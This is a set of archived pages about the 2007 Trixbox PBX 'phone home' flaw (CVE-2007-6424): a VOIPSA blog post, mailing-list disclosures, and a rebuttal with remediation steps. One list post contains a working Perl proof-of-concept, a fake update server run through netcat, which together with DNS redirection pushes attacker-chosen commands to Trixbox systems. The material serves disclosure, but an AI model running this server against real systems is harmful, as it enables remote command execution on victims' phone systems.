=== Content from voipsa.org_4bbf98f3_20250124_164657.html ===

# [Voice of VOIPSA](http://voipsa.org/blog/ "Voice of VOIPSA")

## Collective thoughts and musings on the state of VoIP security today.

Menu
[Skip to content](#content "Skip to content")

* [Home](http://voipsa.org/blog/)
* [Privacy Policy](http://voipsa.org/blog/privacy-policy/)

[![Voice of VOIPSA](http://voipsa.org/blog/wp-content/uploads/voipsa-header3.jpg)](http://voipsa.org/blog/)

# Trixbox contains “phone home” code to retrieve arbitrary commands to execute?

*UPDATE: A [summary of the Trixbox “phone home” issue has been posted](http://www.superunknown.org/pivot/entry.php?id=15), complete with code samples.*

Over the weekend, Than Taro, posted to [the VOIPSEC mailing list](http://www.voipsa.org/VOIPSEC/) news about the Trixbox IP-PBX product containing code to retrieve commands to execute locally. Than writes:

> *A set of scripts were recently discovered in the trixbox line of PBX products, which connect to a remote host every 24 hours, to retrieve an arbitrary list of commands to be executed locally. These scripts were added under the guise of submitting ‘anonymous usage statistics’, however,
>
> with the help of DNS pollution, or malice on the part of the sponsoring
>
> company (Fonality), all up-to-date versions of trixbox could be
>
> instantly disabled, or worse.*
>
> According to trixbox Community Director, Kerry Gerrison, a new version of trixbox will be available by December 18th which will allow you to ‘opt-out’ (meaning that it will still be enabled by default) of this behavior.

Than points people to these two links to read more:

* <http://www.trixbox.org/forums/trixbox-forums/open-discussion/trixbox-phones-home>* <http://www.trixbox.org/trixboxs-new-hardware-audting-tool>

[Trixbox](http://www.trixbox.org/) if you are not aware, is the former “Asterisk@Home” product that basically adds a layer of management and applications on top of the open source [Asterisk](http://www.asterisk.org/) PBX. After it was purchased by Fonality they have been working hard to compete against Digium for the hearts and dollars of companies looking to move to Asterisk-based solutions.

I’m traveling right now and and haven’t been able to thoroughly read the posts. On first glance, though, it sounds like the functionality that Trixbox includes (and, it seems, has included for quite some time) is what is quite common among “managed” commercial products – and even products that are not “managed” do often have these types of functions… but usually there *is* some option to disable it! (And the better ones, in my opinion, start with it *disabled* and let you choose to join in their program.) Such collection of statistics and information *is* incredibly useful to a product manager, so I understand Trixbox’s motivation.

However, it would seem, certainly from the tone of Than’s post to VOIPSEC, that Trixbox was not entirely clear about what they were doing. Given that, it’s only natural that some people would attribute malicious aims to the code when it was found in the code base. It’s not clear to me yet how transparent Trixbox was about what they were doing (it sure sounds like they were *not*). Trixbox’s Kerry Gerrison does state in the forum:

> *We certainly could have gone to any amount of effort to hide this and we fully disclosed our intention to collect bits of data well over a year ago with the release of trixbox 2.0. The engineers asked how how covert we wanted it to be and Andrew and I insisted on several key points:*
>
> a) Its easy to disable
>
> b) It is not compiled code so anyone can clearly see what the code is doing
>
> c) It could not take up any appreciable system resources
>
> d) Collection had to happen at off-hours so as to never impact a system
>
> e) We would not hide any components of it from the users
>
> All of our scripts that we write are completely open code that we welcome the community to go through and be the check and balance against anything we do and we have always been like that. The really hard core guys here had some really sneaky ways to implement this that nobody would ever find or be able to disable but that went completely against most of the directives we laid out so we did it in the most basic means possible so that people could disable it as well as review the code.
>
> The data sent from a system is less than 1k.

So it would appear that they have at least been open about it in the code. Perhaps they did, though, need to be a bit more open in discussing publicly what they were doing in advance. I don’t know… I need to read more to see what they *did* do. (The forum thread is *very* long.)

The one other worrying aspect of what is being reported is that the code would retrieve commands to be run on the local system. Some of these systems that I have seen in the past simply package up statistics locally and then send them in to some central host for analysis. There is no retrieval of commands to be run. Now, I *have* seen “remote management” interfaces that did retrieve commands for local system to run, but for what I would think are obvious reasons, those interfaces were highly secured and encrypted so that the command channel could not be compromised by an attacker. I will be interested to read about how secure – or not – this command channel was made by Trixbox. Kudos to the Trixbox folks for reacting and putting out a new version this week allowing the functionality to be disabled. (Although it would be nice if it could be *disabled by default*.)

All in all it’s a good reminder that as we are in this online world where applications can indeed “phone home”, you do need to understand whether or not your apps are connecting back to servers and what they are doing when they do so.

### Share this:

* [Facebook](http://voipsa.org/blog/2007/12/17/trixbox-contains-phone-home-code-to-retrieve-arbitrary-commands-to-execute/?share=facebook "Click to share on Facebook")
* [Twitter](http://voipsa.org/blog/2007/12/17/trixbox-contains-phone-home-code-to-retrieve-arbitrary-commands-to-execute/?share=twitter "Click to share on Twitter")
* More

* [LinkedIn](http://voipsa.org/blog/2007/12/17/trixbox-contains-phone-home-code-to-retrieve-arbitrary-commands-to-execute/?share=linkedin "Click to share on LinkedIn")
* [Email](http://voipsa.org/blog/2007/12/17/trixbox-contains-phone-home-code-to-retrieve-arbitrary-commands-to-execute/?share=email "Click to email this to a friend")
* [Reddit](http://voipsa.org/blog/2007/12/17/trixbox-contains-phone-home-code-to-retrieve-arbitrary-commands-to-execute/?share=reddit "Click to share on Reddit")

This entry was posted in [Security](http://voipsa.org/blog/category/security/), [VoIP Security](http://voipsa.org/blog/category/voip-security/) on [December 17, 2007](http://voipsa.org/blog/2007/12/17/trixbox-contains-phone-home-code-to-retrieve-arbitrary-commands-to-execute/ "4:04 pm") by [Dan York](http://voipsa.org/blog/author/danyork/ "View all posts by Dan York").

## About Dan York

Dan York is Chairman of the VoIP Security Alliance (VOIPSA). More information about Dan can be found at [danyork.me](http://danyork.me/)

[View all posts by Dan York →](http://voipsa.org/blog/author/danyork/)

### Post navigation

[← Pointers to any audit methodology for forensic analysis of VoIP systems?](http://voipsa.org/blog/2007/12/12/pointers-to-any-audit-methodology-for-forensic-analysis-of-voip-systems/)
[Blue Box Podcast #72 posted – Asterisk vulnerabilities, Skype and the German government, VoIP security news and more →](http://voipsa.org/blog/2007/12/19/blue-box-podcast-72-posted-asterisk-vulnerabilities-skype-and-the-german-government-voip-security-news-and-more/)

Search for:

### Recent Posts

* [SS7 Security On Techmeme? A Reminder About Interconnected Systems…](http://voipsa.org/blog/2014/12/19/ss7-security-on-techmeme-a-reminder-about-interconnected-systems/)
* [Verizon Launches Voice Cypher Secure VoIP Mobile App… With A Government Backdoor](http://voipsa.org/blog/2014/12/13/verizon-launches-voice-cypher-secure-voip-mobile-app-with-a-government-backdoor/)
* [7 Asterisk VoIP Security Advisories Issued](http://voipsa.org/blog/2014/11/21/7-asterisk-voip-security-advisories-issued/)
* [Slides: Reboot the Open Realtime Revolution – #MoreCrypto (Fall 2014)](http://voipsa.org/blog/2014/10/31/slides-reboot-the-open-realtime-revolution-morecrypto-fall-2014/)
* [VoiceOps – Mitigating SIP Threats With SBC Policies, Auto-Blacklisting](http://voipsa.org/blog/2014/09/04/voiceops-mitigating-sip-threats-with-sbc-policies-auto-blacklisting/)
### Top Posts & Pages

* [Asterisk "hack" to show blocked Caller-ID points to larger trust issues with SIP](http://voipsa.org/blog/2008/07/23/asterisk-hack-to-show-blocked-caller-id-points-to-larger-trust-issues-with-sip/)
### Follow Us

[Google+](https://plus.google.com/102712246035253560643)

[Twitter](http://twitter.com/voipsa/)
### Follow us on Twitter

[My Tweets](https://twitter.com/388643878506483712)
### Categories

* [Best Practices](http://voipsa.org/blog/category/best-practices/)
* [Biometrics](http://voipsa.org/blog/category/biometrics/)
* [Blogroll](http://voipsa.org/blog/category/blogroll/)
* [Books](http://voipsa.org/blog/category/books/)
* [CALEA](http://voipsa.org/blog/category/calea/)
* [Certificates and PKI](http://voipsa.org/blog/category/certificates-and-pki/)
* [Cloud](http://voipsa.org/blog/category/cloud/)
* [Conferences](http://voipsa.org/blog/category/conferences/)
* [Cryptography](http://voipsa.org/blog/category/cryptography/)
* [Federation](http://voipsa.org/blog/category/federation/)
* [Fraud](http://voipsa.org/blog/category/fraud-2/)
* [Identity](http://voipsa.org/blog/category/identity/)
* [IETF](http://voipsa.org/blog/category/ietf/)
* [Miscellaneous](http://voipsa.org/blog/category/uncategorized/)
* [Mobile](http://voipsa.org/blog/category/mobile/)
* [Platform Security](http://voipsa.org/blog/category/platform-security/)
* [Podcasts](http://voipsa.org/blog/category/podcasts/)
* [Privacy](http://voipsa.org/blog/category/privacy/)
* [SANS](http://voipsa.org/blog/category/sans/)
* [Security](http://voipsa.org/blog/category/security/)
* [SIP](http://voipsa.org/blog/category/sip/)
* [Skype](http://voipsa.org/blog/category/skype/)
* [SPIT](http://voipsa.org/blog/category/spit/)
* [Standards](http://voipsa.org/blog/category/standards/)
* [Unified Communications](http://voipsa.org/blog/category/unified-communications/)
* [Videos](http://voipsa.org/blog/category/videos/)
* [Voice of VOIPSA Info](http://voipsa.org/blog/category/voipsa-blog-info/)
* [VoIP Attacks in the News](http://voipsa.org/blog/category/voip-attacks-in-the-news/)
* [VoIP Legislation](http://voipsa.org/blog/category/voip-legislation/)
* [VoIP Security](http://voipsa.org/blog/category/voip-security/)
* [VoIP Security Companies](http://voipsa.org/blog/category/voip-security-companies/)
* [VoIP Security Research](http://voipsa.org/blog/category/voip-security-research/)
* [VoIP Security Tools](http://voipsa.org/blog/category/voip-security-tools/)
* [VoIP Vulnerabilities](http://voipsa.org/blog/category/voip-vulnerabilities/)
* [VOIPSA](http://voipsa.org/blog/category/voipsa/)
* [Webcast](http://voipsa.org/blog/category/webcast/)
* [Webinars](http://voipsa.org/blog/category/webinars/)
### Archives

* [December 2014](http://voipsa.org/blog/2014/12/)
* [November 2014](http://voipsa.org/blog/2014/11/)
* [October 2014](http://voipsa.org/blog/2014/10/)
* [September 2014](http://voipsa.org/blog/2014/09/)
* [January 2014](http://voipsa.org/blog/2014/01/)
* [December 2013](http://voipsa.org/blog/2013/12/)
* [November 2013](http://voipsa.org/blog/2013/11/)
* [October 2013](http://voipsa.org/blog/2013/10/)
* [August 2013](http://voipsa.org/blog/2013/08/)
* [April 2013](http://voipsa.org/blog/2013/04/)
* [February 2013](http://voipsa.org/blog/2013/02/)
* [November 2012](http://voipsa.org/blog/2012/11/)
* [April 2012](http://voipsa.org/blog/2012/04/)
* [January 2012](http://voipsa.org/blog/2012/01/)
* [December 2011](http://voipsa.org/blog/2011/12/)
* [October 2011](http://voipsa.org/blog/2011/10/)
* [September 2011](http://voipsa.org/blog/2011/09/)
* [August 2011](http://voipsa.org/blog/2011/08/)
* [May 2011](http://voipsa.org/blog/2011/05/)
* [April 2011](http://voipsa.org/blog/2011/04/)
* [March 2011](http://voipsa.org/blog/2011/03/)
* [February 2011](http://voipsa.org/blog/2011/02/)
* [January 2011](http://voipsa.org/blog/2011/01/)
* [December 2010](http://voipsa.org/blog/2010/12/)
* [November 2010](http://voipsa.org/blog/2010/11/)
* [October 2010](http://voipsa.org/blog/2010/10/)
* [September 2010](http://voipsa.org/blog/2010/09/)
* [August 2010](http://voipsa.org/blog/2010/08/)
* [July 2010](http://voipsa.org/blog/2010/07/)
* [June 2010](http://voipsa.org/blog/2010/06/)
* [May 2010](http://voipsa.org/blog/2010/05/)
* [April 2010](http://voipsa.org/blog/2010/04/)
* [March 2010](http://voipsa.org/blog/2010/03/)
* [February 2010](http://voipsa.org/blog/2010/02/)
* [January 2010](http://voipsa.org/blog/2010/01/)
* [December 2009](http://voipsa.org/blog/2009/12/)
* [October 2009](http://voipsa.org/blog/2009/10/)
* [September 2009](http://voipsa.org/blog/2009/09/)
* [August 2009](http://voipsa.org/blog/2009/08/)
* [July 2009](http://voipsa.org/blog/2009/07/)
* [June 2009](http://voipsa.org/blog/2009/06/)
* [May 2009](http://voipsa.org/blog/2009/05/)
* [April 2009](http://voipsa.org/blog/2009/04/)
* [March 2009](http://voipsa.org/blog/2009/03/)
* [February 2009](http://voipsa.org/blog/2009/02/)
* [January 2009](http://voipsa.org/blog/2009/01/)
* [December 2008](http://voipsa.org/blog/2008/12/)
* [November 2008](http://voipsa.org/blog/2008/11/)
* [October 2008](http://voipsa.org/blog/2008/10/)
* [September 2008](http://voipsa.org/blog/2008/09/)
* [August 2008](http://voipsa.org/blog/2008/08/)
* [July 2008](http://voipsa.org/blog/2008/07/)
* [June 2008](http://voipsa.org/blog/2008/06/)
* [May 2008](http://voipsa.org/blog/2008/05/)
* [April 2008](http://voipsa.org/blog/2008/04/)
* [March 2008](http://voipsa.org/blog/2008/03/)
* [February 2008](http://voipsa.org/blog/2008/02/)
* [January 2008](http://voipsa.org/blog/2008/01/)
* [December 2007](http://voipsa.org/blog/2007/12/)
* [November 2007](http://voipsa.org/blog/2007/11/)
* [October 2007](http://voipsa.org/blog/2007/10/)
* [September 2007](http://voipsa.org/blog/2007/09/)
* [August 2007](http://voipsa.org/blog/2007/08/)
* [July 2007](http://voipsa.org/blog/2007/07/)
* [June 2007](http://voipsa.org/blog/2007/06/)
* [May 2007](http://voipsa.org/blog/2007/05/)
* [April 2007](http://voipsa.org/blog/2007/04/)
* [March 2007](http://voipsa.org/blog/2007/03/)
* [February 2007](http://voipsa.org/blog/2007/02/)
* [January 2007](http://voipsa.org/blog/2007/01/)
* [December 2006](http://voipsa.org/blog/2006/12/)
* [November 2006](http://voipsa.org/blog/2006/11/)
* [October 2006](http://voipsa.org/blog/2006/10/)
* [September 2006](http://voipsa.org/blog/2006/09/)
* [August 2006](http://voipsa.org/blog/2006/08/)
* [July 2006](http://voipsa.org/blog/2006/07/)
* [June 2006](http://voipsa.org/blog/2006/06/)
* [May 2006](http://voipsa.org/blog/2006/05/)
* [April 2006](http://voipsa.org/blog/2006/04/)

[Privacy Policy](http://voipsa.org/blog/privacy-policy/) [Proudly powered by WordPress](https://wordpress.org/ "Semantic Personal Publishing Platform")

Send to Email Address

Your Name

Your Email Address

![loading](http://voipsa.org/blog/wp-content/plugins/jetpack/modules/sharedaddy/images/loading.gif)

[Cancel](#cancel)
Post was not sent - check your email addresses!
Email check failed, please try again
Sorry, your blog cannot share posts by email.



=== Content from voipsa.org_b2af8bb3_20250124_164657.html ===

# [VOIPSEC] Trixbox Arbitrary Command Execution Vulnerability

**Than Taro**
thanrantaro at live.com

*Sat Dec 15 22:41:41 CST 2007*

* Previous message (by thread): [[VOIPSEC] BackTrack 3 - now with enhanced VoIP section](002521.html)
* Next message (by thread): [[VOIPSEC] Blue Box Podcast #72 is now live - Asterisk security vulnerabilities, Skype & the German gov't, other VoIP security news and more..](002523.html)
* **Messages sorted by:**
  [[ date ]](date.html#2522)
  [[ thread ]](thread.html#2522)
  [[ subject ]](subject.html#2522)
  [[ author ]](author.html#2522)

---

```

A
set of scripts were recently discovered in the trixbox line of PBX
products, which connect to a remote host every 24 hours, to retrieve an arbitrary
list of commands to be executed locally.  These scripts were added
under the guise of submitting 'anonymous usage statistics', however,
with the help of DNS pollution, or malice on the part of the sponsoring
company (Fonality), all up-to-date versions of trixbox could be
instantly disabled, or worse.

According to trixbox Community
Director, Kerry Gerrison, a new version of trixbox will be available by
December 18th which will allow you to 'opt-out' (meaning that it will
still be enabled by default) of this behavior.

Further details:
<http://www.trixbox.org/forums/trixbox-forums/open-discussion/trixbox-phones-home>
<http://www.trixbox.org/trixboxs-new-hardware-audting-tool>

_________________________________________________________________
Don't get caught with egg on your face. Play Chicktionary!
<http://club.live.com/chicktionary.aspx?icid=chick_wlhmtextlink1_dec>

```

---

* Previous message (by thread): [[VOIPSEC] BackTrack 3 - now with enhanced VoIP section](002521.html)
* Next message (by thread): [[VOIPSEC] Blue Box Podcast #72 is now live - Asterisk security vulnerabilities, Skype & the German gov't, other VoIP security news and more..](002523.html)
* **Messages sorted by:**
  [[ date ]](date.html#2522)
  [[ thread ]](thread.html#2522)
  [[ subject ]](subject.html#2522)
  [[ author ]](author.html#2522)

---

[More information about the Voipsec
mailing list](http://voipsa.org/mailman/listinfo/voipsec_voipsa.org)



=== Content from voipsa.org_2cbc1152_20250124_164657.html ===

# [VOIPSEC] trixbox vuln (CVE-2007-6424) - PoC exploit code

**Than Taro**
thanrantaro at live.com

*Tue Dec 18 21:25:46 CST 2007*

* Previous message (by thread): [[VOIPSEC] AST-2007-027 - Database matching order permits host-based authentication to be ignored](002527.html)
* Next message (by thread): [[VOIPSEC] trixbox vuln (CVE-2007-6424) - PoC exploit code](002529.html)
* **Messages sorted by:**
  [[ date ]](date.html#2528)
  [[ thread ]](thread.html#2528)
  [[ subject ]](subject.html#2528)
  [[ author ]](author.html#2528)

---

```

Since Fonality has been incredibly slow in dealing with this (it was
reported publicly on Saturday, and they don't expect to have a fix
until at least Friday), I decided to take it upon myself to get a CVE,
and also
write some exploit code.  I feel that 72+ hours is more than enough
time to fix something this simple.  They also do not appear to have any
intentions of posting an advisory.

Run this in a simple script such as `while :; do netcat -l -p 80 -c
"perl trixbox-exploit.pl"; done`, and then a trivial DNS redirection
can take it from there.

trixbox:~$ cat trixbox-exploit.pl

#!/usr/bin/perl

use strict;

use Crypt::CBC;

my $cipher = Crypt::CBC->new( -cipher => "Blowfish", -key => "00000000000000000000000000000000" );

my $req = <STDIN>;

chomp $req;

my $hax;

if( $req =~ /ce00000000000000000000000000000000/ )

{

        $hax = $cipher->encrypt( "1\nce00000000000000000000000000000000\necho Exploited" );

}

elsif( $req =~ /generate_id/ )

{

        $hax = "ce00000000000000000000000000000000\n00000000000000000000000000000000";

}

else

{

        $hax = "ERROR: invalid server id";

}

print "$hax";

trixbox:~$

_________________________________________________________________
Share life as it happens with the new Windows Live.
<http://www.windowslive.com/share.html?ocid=TXT_TAGHM_Wave2_sharelife_122007>

```

---

* Previous message (by thread): [[VOIPSEC] AST-2007-027 - Database matching order permits host-based authentication to be ignored](002527.html)
* Next message (by thread): [[VOIPSEC] trixbox vuln (CVE-2007-6424) - PoC exploit code](002529.html)
* **Messages sorted by:**
  [[ date ]](date.html#2528)
  [[ thread ]](thread.html#2528)
  [[ subject ]](subject.html#2528)
  [[ author ]](author.html#2528)

---

[More information about the Voipsec
mailing list](http://voipsa.org/mailman/listinfo/voipsec_voipsa.org)



=== Content from voipsa.org_add8e153_20250124_164657.html ===

# [VOIPSEC] trixbox vulnerability fluff

**total impact**
totalimpact8 at gmail.com

*Wed Dec 19 13:20:31 CST 2007*

* Previous message (by thread): [[VOIPSEC] trixbox vuln (CVE-2007-6424) - PoC exploit code](002532.html)
* Next message (by thread): [[VOIPSEC] Interesting Article - Many VOIP vulnerabilities few exploits?](002534.html)
* **Messages sorted by:**
  [[ date ]](date.html#2533)
  [[ thread ]](thread.html#2533)
  [[ subject ]](subject.html#2533)
  [[ author ]](author.html#2533)

---

```
than taro (aka pk) has written a vulnerability that is only accessible
through some other vulnerability:

Your ISP has been hijacked (you shouldnt use an ISP that gets hijacked -
duh)
Your router gets hacked (your fault for not securing router - this is the
main point of entry)
Someone splices into the wire (you have a much bigger problem, they have
physical access to your entire network and property)

If someone has any of the above, then they have no care for security, and a
flaw in some code that had good intentions is pretty minor, as several other
much more important systems would most likely be at risk through other
avenues.

If someone has hijacked your router, they nearly have physical access to
your network, and most likely the phone system would only be a small piece
of a larger list of vulnerable servers.

While there is genuine reason to be concerned about this problem for several
reasons, and several users have legitimately voiced their opinion as they
have the right, mr. taro is putting unnecessary urgency on an issue that is
not quite as vulnerable as he would like it to be.

Two immediate fixes have been announced to this flaw, and can be immediately
applied by anyone - the joy of community driven open source software, the
community found a problem, and created its own patch, now on to more
important development and the advancement of asterisk based PBXes - right -
wrong as mr taro would have it.

Fix 1 - at your linux CLI:
rm /var/adm/bin/recognition.pl

Fix 2 - at your linux CLI:
1. type: crontab -e then press enter
2. Place your cursor on the line that contains 'registry.pl'
3. Type 'dd' to delete the line
4. Type ':w' to save the file
5. Type ':q' to exit

Don't type the 'quotes'

Than seems to fain concern about other users and how they are vulnerable, so
there is a posted fix for them here if these other users are looking for
these security advisories here instead of the trixbox website. For the most
part his postings on several forums, bbs, and websites seem to be an
indirect way of making the trixbox group look bad for their unintentional
mistake, and making his own distro a more favorable alternative, a childish
ploy used quite widely today in politics. But I forgot - this isnt politics,
its for the benefit of the community right?

```

---

* Previous message (by thread): [[VOIPSEC] trixbox vuln (CVE-2007-6424) - PoC exploit code](002532.html)
* Next message (by thread): [[VOIPSEC] Interesting Article - Many VOIP vulnerabilities few exploits?](002534.html)
* **Messages sorted by:**
  [[ date ]](date.html#2533)
  [[ thread ]](thread.html#2533)
  [[ subject ]](subject.html#2533)
  [[ author ]](author.html#2533)

---

[More information about the Voipsec
mailing list](http://voipsa.org/mailman/listinfo/voipsec_voipsa.org)



=== Content from www.trixbox.org_dc9de4b1_20250124_164658.html ===


[Buy this domain.](https://www.mydomaincontact.com/?domain_name=trixbox.org)

2025 Copyright. All Rights Reserved.

Privacy Policy


